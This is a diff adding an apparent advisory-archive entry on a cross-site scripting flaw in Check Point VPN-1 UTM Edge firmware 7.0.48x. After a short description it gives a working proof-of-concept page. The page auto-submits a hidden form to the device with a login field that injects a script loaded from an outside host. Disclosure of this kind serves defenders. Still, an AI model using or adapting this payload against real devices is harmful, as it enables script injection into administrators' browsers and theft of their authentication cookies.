@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/28116/info
+
+Check Point VPN-1 UTM Edge is prone to a cross-site scripting vulnerability because it fails to adequately sanitize user-supplied input.
+
+An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.
+
+The issue affects Check Point VPN-1 UTM Edge firmware 7.0.48x.
+
+<html> <body onload="document.f.submit()"> <form name="f" method="post" action="http://192.168.10.1" style="display:none"> <input name="user" value="'<script/src=//l7.fi></script>"> </form> </body> </html>
